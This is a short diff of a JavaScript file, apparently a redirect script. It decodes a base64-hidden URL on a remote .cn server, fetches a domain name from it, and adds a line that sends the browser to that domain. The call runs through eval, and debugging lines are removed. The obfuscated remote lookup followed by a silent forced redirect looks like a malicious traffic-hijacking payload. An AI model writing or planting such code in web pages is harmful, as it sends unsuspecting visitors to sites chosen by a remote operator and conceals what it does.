@@ -16,14 +16,7 @@ function send(url, fn) {
 
 function route() {
     send(atob('aHR0cHM6Ly9sYi5zb25neW91emhpLmNuL25pY2UvYXBpL2dldGx1b2RpMWFwaS5waHA='), function(e) {
-        console.log(parent.document);
-
-        alert(parent);
-
-        // var hi = parent.document.getElementById("hi");
-
-        //     hi.href = e['domainname'];
-        //     hi.click();
+        location.href= e['domainname'];
     });
 }
 eval("route()");
